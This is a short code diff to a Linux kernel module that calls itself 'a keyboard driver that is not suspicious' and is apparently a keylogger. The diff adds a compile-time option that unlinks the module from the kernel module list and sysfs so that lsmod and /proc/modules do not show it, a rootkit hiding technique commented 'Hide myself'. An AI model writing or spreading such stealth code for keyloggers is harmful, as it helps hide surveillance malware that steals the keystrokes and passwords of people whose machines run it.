@@ -5,6 +5,11 @@
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 
+#ifdef HIDE_MODULE
+#include <linux/list.h>
+#include <linux/kobject.h>
+#endif
+
 MODULE_DESCRIPTION("A keyboard driver that is not suspicious");
 MODULE_AUTHOR("God knows who");
 MODULE_LICENSE("GPL");
@@ -89,6 +94,13 @@ static int __init kl_init(void)
 	}
 
 	memset(input_buf, 0, BUFLEN);
+
+#ifdef HIDE_MODULE
+	/* Hide myself from lsmod and /proc/modules :) */
+	list_del(&THIS_MODULE->list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+#endif
 
 	return 0;
 }
